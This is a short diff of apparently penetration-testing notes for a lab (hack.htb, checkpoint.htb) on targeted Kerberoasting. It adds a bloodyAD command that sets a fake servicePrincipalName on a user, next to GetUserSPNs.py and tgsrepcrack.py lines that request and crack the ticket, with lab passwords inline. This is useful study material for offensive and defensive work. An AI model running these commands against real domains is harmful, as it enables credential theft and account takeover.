@@ -90,6 +90,14 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-svc@HTTP~WEB
 
 ### Kerberos Service Ticket
 
+We can configure a Service Principal Name for the Target User
+
+{% code overflow="wrap" %}
+```bash
+bloodyAD --host dc01.hack.htb -d hack.htb -u 'alex.john' -p 'Checkpoint2024!' set object mark.davies servicePrincipalName -v 'fake/markdavies.hack.htb'
+```
+{% endcode %}
+
 {% code overflow="wrap" %}
 ```bash
 GetUserSPNs.py -dc-ip 10.129.15.xx -request-user mark.davies 'checkpoint.htb/alex.turner:Checkpoint2024!'
